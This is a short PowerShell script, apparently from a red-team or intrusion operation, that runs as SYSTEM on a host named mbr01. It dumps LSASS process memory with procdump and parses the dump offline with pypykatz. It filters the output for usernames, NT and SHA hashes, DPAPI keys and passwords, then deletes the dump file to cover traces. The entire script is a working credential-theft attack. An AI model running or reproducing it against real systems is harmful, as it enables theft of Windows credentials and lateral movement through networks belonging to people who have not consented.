# 3.5K v5: procdump LSASS + pypykatz minidump parse (as SYSTEM on mbr01)
$ErrorActionPreference = 'Continue'
$pd = 'C:\Windows\Temp\cadre-tools\procdump64.exe'
$py = 'C:\Windows\Temp\cadre-tools\pypykatz.exe'
$dump = 'C:\Windows\Temp\cadre-lsass5.dmp'
$o = 'C:\Windows\Temp\pypykatz-out.txt'

# 1. procdump full LSASS
Remove-Item $dump, $o -ErrorAction SilentlyContinue
cmd.exe /c "`"$pd`" -accepteula -ma lsass.exe `"$dump`" > nul 2>&1"
Start-Sleep -Seconds 5
Write-Output "DUMP_EXISTS $(Test-Path $dump)"
if (Test-Path $dump) {
    Write-Output "DUMP_SIZE $((Get-Item $dump).Length)"

    # 2. pypykatz parse offline
    & $py lsa minidump $dump > $o 2>&1
    Start-Sleep -Seconds 2
    Write-Output "PYPYKATZ_OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
    Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern '== Logon|username|domainname|NT:|NThash|SHAHash|DPAPI|password|sid' | Select-Object -First 50 | ForEach-Object { $_.Line }

    Remove-Item $dump -ErrorAction SilentlyContinue
    Write-Output "DUMP_CLEANED $(-not (Test-Path $dump))"
} else { Write-Output 'DUMP_MISSING' }
Write-Output '3.5K_V5_DONE'
